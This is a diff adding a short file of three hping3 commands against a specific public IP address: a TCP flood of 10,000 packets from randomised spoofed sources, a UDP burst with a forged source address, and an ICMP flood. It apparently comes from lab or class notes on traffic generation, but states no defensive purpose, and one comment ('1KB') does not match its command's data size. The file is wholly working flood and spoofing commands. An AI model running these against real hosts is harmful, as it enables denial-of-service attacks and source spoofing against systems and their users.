@@ -1,0 +1,10 @@
+1) 10,000 TCP packets all at once from random source IP Addresses
+hping3 159.203.43.128 -c 10000 --rand-source --faster
+
+
+2) 9,000 UDP packets in a span of 90 seconds from a spoofed source address
+hping3 -2 -c 9000 -i 9000 -S 159.203.43.128 -a 192.168.4.245
+
+
+3) 11,000 ICMP packets with a data size of 1KB at an interval of 75 packets per second
+hping3 159.203.43.128 -1 -c 11000 -d 1 -i u7500
